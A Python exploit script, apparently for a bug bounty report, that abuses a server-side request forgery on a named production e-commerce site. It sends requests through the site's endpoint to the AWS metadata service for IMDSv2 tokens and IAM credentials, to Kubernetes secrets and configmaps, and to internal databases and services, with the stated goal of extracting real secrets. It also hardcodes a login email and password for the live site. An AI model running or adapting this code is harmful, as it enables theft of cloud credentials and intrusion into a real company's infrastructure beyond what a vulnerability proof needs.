#!/usr/bin/env python3
"""
Get REAL Data from SSRF - Critical Techniques to Strengthen the Report
Goal: Extract actual data (IAM credentials, K8s secrets, internal data) to make report undeniable
"""

import requests
import json
import time
from datetime import datetime
from urllib.parse import quote

class RealDataExtractor:
    def __init__(self, base_url, cookies):
        self.base_url = base_url
        self.cookies = cookies
        self.session = requests.Session()
        self.session.cookies.update(cookies)
        self.session.verify = False
        self.critical_findings = []
        
    def log_critical(self, title, details, response_data):
        finding = {
            "timestamp": datetime.now().isoformat(),
            "severity": "CRITICAL",
            "title": title,
            "details": details,
            "response": response_data
        }
        self.critical_findings.append(finding)
        print(f"\n[🔥 CRITICAL] {title}")
        print(f"   {details}")
        if response_data.get("data"):
            print(f"   Data: {response_data['data'][:200]}...")
            
    def test_aws_imdsv2_token(self):
        """Try AWS IMDSv2 - might be less protected and return actual data"""
        print("\n[1] AWS IMDSv2 TOKEN EXTRACTION...")
        print("=" * 70)
        
        try:
            # Step 1: Get IMDSv2 token
            resp = self.session.post(
                f"{self.base_url}/zootopia-events/api/events/sites/1",
                json={
                    "url": "http://169.254.169.254/latest/api/token",
                    "method": "PUT",
                    "headers": {
                        "X-aws-ec2-metadata-token-ttl-seconds": "21600"
                    }
                },
                timeout=15
            )
            
            print(f"   Token request: {resp.status_code}")
            print(f"   Response: {resp.text[:200]}")
            print(f"   Headers: {dict(resp.headers)}")
            
            if resp.status_code == 200 and resp.text and resp.text != "{}":
                token = resp.text.strip()
                if len(token) > 10:  # Valid token
                    self.log_critical(
                        "AWS IMDSv2 Token Obtained",
                        f"Got IMDSv2 token: {token[:50]}...",
                        {"status": resp.status_code, "token": token, "full_response": resp.text}
                    )
                    
                    # Step 2: Use token to get IAM role
                    resp2 = self.session.post(
                        f"{self.base_url}/zootopia-events/api/events/sites/1",
                        json={
                            "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                            "headers": {"X-aws-ec2-metadata-token": token}
                        },
                        timeout=15
                    )
                    
                    if resp2.status_code == 200 and resp2.text and resp2.text != "{}":
                        self.log_critical(
                            "AWS IAM Role Name Retrieved",
                            f"Got IAM role via IMDSv2: {resp2.text[:100]}",
                            {"status": resp2.status_code, "data": resp2.text}
                        )
                        
                        # Step 3: Get actual credentials
                        role_name = resp2.text.strip().split('\n')[0] if '\n' in resp2.text else resp2.text.strip()
                        if role_name:
                            resp3 = self.session.post(
                                f"{self.base_url}/zootopia-events/api/events/sites/1",
                                json={
                                    "url": f"http://169.254.169.254/latest/meta-data/iam/security-credentials/{role_name}",
                                    "headers": {"X-aws-ec2-metadata-token": token}
                                },
                                timeout=15
                            )
                            
                            if resp3.status_code == 200 and resp3.text and resp3.text != "{}":
                                self.log_critical(
                                    "AWS IAM Credentials Retrieved",
                                    f"Got IAM credentials for role {role_name}",
                                    {"status": resp3.status_code, "data": resp3.text}
                                )
        except Exception as e:
            print(f"   Error: {e}")
            
    def test_aws_metadata_all_variants(self):
        """Try ALL AWS metadata endpoints with different techniques"""
        print("\n[2] AWS METADATA - ALL VARIANTS...")
        print("=" * 70)
        
        endpoints = [
            "/latest/meta-data/iam/security-credentials/",
            "/latest/meta-data/iam/security-credentials",  # Without trailing slash
            "/latest/meta-data/instance-id",
            "/latest/meta-data/placement/availability-zone",
            "/latest/meta-data/placement/region",
            "/latest/meta-data/ami-id",
            "/latest/meta-data/instance-type",
            "/latest/meta-data/local-ipv4",
            "/latest/meta-data/public-ipv4",
            "/latest/meta-data/hostname",
            "/latest/meta-data/",
            "/latest/dynamic/instance-identity/document",
            "/latest/user-data",  # User data script
            "/latest/meta-data/public-keys/",
            "/latest/meta-data/iam/info",  # IAM info
        ]
        
        # Try with different Accept headers
        accept_headers = [
            "text/plain",
            "text/plain, */*",
            "*/*",
            "application/json",
            "",  # No Accept header
        ]
        
        for endpoint in endpoints:
            for accept in accept_headers:
                try:
                    headers = {}
                    if accept:
                        headers["Accept"] = accept
                        
                    resp = self.session.post(
                        f"{self.base_url}/zootopia-events/api/events/sites/1",
                        json={
                            "url": f"http://169.254.169.254{endpoint}",
                            "headers": headers
                        },
                        timeout=10
                    )
                    
                    if resp.status_code == 200:
                        # Check if we got actual data
                        if resp.text and resp.text != "{}" and len(resp.text.strip()) > 5:
                            # Check if it's not just an error message
                            if not any(err in resp.text.lower() for err in ["error", "not found", "forbidden", "403", "404"]):
                                self.log_critical(
                                    f"AWS Metadata Data Retrieved: {endpoint}",
                                    f"Got data with Accept: {accept}",
                                    {"status": resp.status_code, "endpoint": endpoint, "accept": accept, "data": resp.text}
                                )
                                break  # Found data, no need to try other Accept headers
                except Exception as e:
                    pass
                    
    def test_kubernetes_api_data_extraction(self):
        """Try to get actual data from Kubernetes API"""
        print("\n[3] KUBERNETES API - DATA EXTRACTION...")
        print("=" * 70)
        
        # Try different query parameters and endpoints
        k8s_tests = [
            # Try to get limited data
            ("GET", "/api/v1/namespaces/default/secrets?limit=1"),
            ("GET", "/api/v1/namespaces/default/configmaps?limit=1"),
            ("GET", "/api/v1/namespaces/default/pods?limit=1"),
            
            # Try fieldSelector to get specific secrets
            ("GET", "/api/v1/namespaces/default/secrets?fieldSelector=metadata.name=default-token"),
            
            # Try to get service account
            ("GET", "/api/v1/namespaces/default/serviceaccounts/default"),
            
            # Try to get namespace info
            ("GET", "/api/v1/namespaces/default"),
            
            # Try to list with watch=false
            ("GET", "/api/v1/namespaces/default/secrets?watch=false&limit=1"),
            
            # Try to get specific resource
            ("GET", "/api/v1/namespaces/default/secrets/default-token"),
            
            # Try events
            ("GET", "/api/v1/namespaces/default/events?limit=1"),
        ]
        
        for method, endpoint in k8s_tests:
            try:
                resp = self.session.post(
                    f"{self.base_url}/zootopia-events/api/events/sites/1",
                    json={
                        "url": f"https://kubernetes.default.svc{endpoint}",
                        "method": method,
                        "headers": {
                            "Accept": "application/json",
                            "Authorization": "Bearer invalid"  # Try with invalid token - might still return some data
                        }
                    },
                    timeout=15
                )
                
                print(f"   {method} {endpoint}: {resp.status_code}")
                
                if resp.status_code == 200:
                    # Try to parse JSON
                    try:
                        data = resp.json()
                        if data and data != {}:
                            # Check if we got actual data
                            data_str = json.dumps(data)
                            if len(data_str) > 100:  # Got substantial data
                                self.log_critical(
                                    f"Kubernetes Data Retrieved: {endpoint}",
                                    f"Got {len(data_str)} bytes of data",
                                    {"status": resp.status_code, "endpoint": endpoint, "data": data_str[:1000]}
                                )
                    except:
                        # Not JSON, check if it's text data
                        if resp.text and resp.text != "{}" and len(resp.text) > 100:
                            self.log_critical(
                                f"Kubernetes Response Data: {endpoint}",
                                f"Got {len(resp.text)} bytes of response",
                                {"status": resp.status_code, "endpoint": endpoint, "data": resp.text[:1000]}
                            )
                            
                # Also check headers for any data leaks
                for header_name, header_value in resp.headers.items():
                    if any(keyword in header_value.lower() for keyword in ["secret", "token", "credential", "key"]):
                        self.log_critical(
                            f"Data Leak in Header: {header_name}",
                            f"Found sensitive data in response header",
                            {"header": header_name, "value": header_value}
                        )
                        
            except Exception as e:
                print(f"   Error: {e}")
                
    def test_internal_services_data(self):
        """Try to get data from internal services"""
        print("\n[4] INTERNAL SERVICES - DATA EXTRACTION...")
        print("=" * 70)
        
        # Common internal services that might return data
        services = [
            # Databases (might return error messages with version info)
            ("http://mysql.default.svc:3306", "MySQL"),
            ("http://postgres.default.svc:5432", "PostgreSQL"),
            ("http://mongodb.default.svc:27017", "MongoDB"),
            ("http://redis.default.svc:6379", "Redis"),
            
            # Search engines
            ("http://elasticsearch.default.svc:9200", "Elasticsearch"),
            ("http://elasticsearch.default.svc:9200/_cat", "Elasticsearch Cat API"),
            
            # Monitoring
            ("http://prometheus.default.svc:9090/api/v1/status/config", "Prometheus"),
            ("http://grafana.default.svc:3000/api/health", "Grafana"),
            
            # Internal APIs
            ("http://api-internal.default.svc/health", "Internal API"),
            ("http://backend.default.svc/health", "Backend"),
        ]
        
        for url, name in services:
            try:
                resp = self.session.post(
                    f"{self.base_url}/zootopia-events/api/events/sites/1",
                    json={"url": url},
                    timeout=10
                )
                
                if resp.status_code == 200:
                    # Check if we got actual data
                    if resp.text and resp.text != "{}" and len(resp.text) > 10:
                        # Check if it's not just an error
                        if not any(err in resp.text.lower() for err in ["connection refused", "timeout"]):
                            self.log_critical(
                                f"Internal Service Data: {name}",
                                f"Got data from {url}",
                                {"status": resp.status_code, "service": name, "url": url, "data": resp.text[:500]}
                            )
                            
                    # Check headers
                    if "server" in resp.headers:
                        server_header = resp.headers["server"]
                        if any(keyword in server_header.lower() for keyword in ["mysql", "postgres", "redis", "elasticsearch", "mongodb"]):
                            self.log_critical(
                                f"Service Version Leak: {name}",
                                f"Server header reveals service: {server_header}",
                                {"status": resp.status_code, "service": name, "server_header": server_header}
                            )
            except Exception as e:
                pass
                
    def test_response_header_leaks(self):
        """Check if response headers leak internal data"""
        print("\n[5] RESPONSE HEADER ANALYSIS...")
        print("=" * 70)
        
        test_urls = [
            "http://169.254.169.254/latest/meta-data/instance-id",
            "https://kubernetes.default.svc/api/v1/namespaces/default/secrets",
            "http://127.0.0.1:8080",
        ]
        
        sensitive_keywords = [
            "instance", "role", "secret", "token", "credential", "key",
            "aws", "iam", "k8s", "kubernetes", "namespace", "pod"
        ]
        
        for url in test_urls:
            try:
                resp = self.session.post(
                    f"{self.base_url}/zootopia-events/api/events/sites/1",
                    json={"url": url},
                    timeout=10
                )
                
                # Check all headers for sensitive data
                for header_name, header_value in resp.headers.items():
                    header_lower = header_value.lower()
                    for keyword in sensitive_keywords:
                        if keyword in header_lower:
                            self.log_critical(
                                f"Header Data Leak: {header_name}",
                                f"Found '{keyword}' in header value",
                                {"header": header_name, "value": header_value, "url": url}
                            )
            except Exception as e:
                pass
                
    def run_all_tests(self):
        """Run all data extraction tests"""
        print("\n" + "=" * 70)
        print("REAL DATA EXTRACTION - CRITICAL TECHNIQUES")
        print("=" * 70)
        print("\nGoal: Extract actual data (IAM credentials, K8s secrets, internal data)")
        print("to make the SSRF report undeniable for HackerOne bounty.\n")
        
        self.test_aws_imdsv2_token()
        self.test_aws_metadata_all_variants()
        self.test_kubernetes_api_data_extraction()
        self.test_internal_services_data()
        self.test_response_header_leaks()
        
        # Save results
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        output_file = f"logs/real_data_extraction_{timestamp}.json"
        
        with open(output_file, 'w', encoding='utf-8') as f:
            json.dump(self.critical_findings, f, indent=2, ensure_ascii=False)
            
        print("\n" + "=" * 70)
        print(f"[+] Results saved to: {output_file}")
        print(f"[+] Critical findings: {len(self.critical_findings)}")
        print("=" * 70)
        
        if self.critical_findings:
            print("\n🔥 CRITICAL FINDINGS:")
            for i, finding in enumerate(self.critical_findings, 1):
                print(f"\n{i}. {finding['title']}")
                print(f"   {finding['details']}")
        else:
            print("\n[!] No critical data extracted, but SSRF is still confirmed via Method 1 (header reflection)")
            
        return self.critical_findings

def login():
    """Login to get session cookies"""
    import re
    import urllib.parse
    
    session = requests.Session()
    session.headers.update({
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept": "*/*",
    })
    session.verify = False
    
    ACCOUNT = {"email": "suobup@dunkos.xyz", "password": "suobup@dunkos.xyzQ1"}
    AUTH_URL = "https://login.zooplus.de/auth/realms/zooplus/protocol/openid-connect/auth"
    
    try:
        params = {
            "response_type": "code",
            "client_id": "shop-myzooplus-prod-zooplus",
            "redirect_uri": "https://www.zooplus.de/web/sso-myzooplus/login",
            "state": "pentest",
            "login": "true",
            "ui_locales": "de-DE",
            "scope": "openid"
        }
        r1 = session.get(AUTH_URL, params=params, timeout=10, verify=False)
        m = re.search(r'action="([^"]*login-actions/[^"]+)"', r1.text)
        if m:
            action = m.group(1).replace("&amp;", "&")
            if not action.startswith("http"):
                action = urllib.parse.urljoin(r1.url, action)
            r2 = session.post(
                action,
                data={"username": ACCOUNT["email"], "password": ACCOUNT["password"], "credentialId": ""},
                timeout=10,
                verify=False,
                allow_redirects=False
            )
            loc = r2.headers.get("Location", "")
            if loc:
                session.get(loc, timeout=10, verify=False, allow_redirects=True)
                session.get("https://www.zooplus.de/web/sso-myzooplus/login-successful.htm", timeout=10, verify=False)
                session.get("https://www.zooplus.de/account/overview", timeout=10, verify=False)
                return session.cookies.get_dict()
    except Exception as e:
        print(f"[!] Login error: {e}")
    return {}

if __name__ == "__main__":
    # Load cookies - try multiple locations
    import os
    cookies = {}
    
    # Try to load from cookies.json
    cookie_files = ["cookies.json", "SSRF_VULNERABILITY/cookies.json", "../cookies.json"]
    
    for cookie_file in cookie_files:
        if os.path.exists(cookie_file):
            try:
                with open(cookie_file, 'r') as f:
                    cookies = json.load(f)
                print(f"[+] Loaded cookies from {cookie_file}")
                break
            except:
                pass
    
    # If no cookies file, try to login
    if not cookies:
        print("[!] No cookies.json found. Attempting login...")
        cookies = login()
        if cookies:
            print("[+] Login successful!")
        else:
            print("[!] Login failed. Please create cookies.json with: {\"sid\": \"your_session_id\"}")
            print("[!] Or check your credentials in the script")
        
    base_url = "https://www.zooplus.de"
    
    extractor = RealDataExtractor(base_url, cookies)
    findings = extractor.run_all_tests()

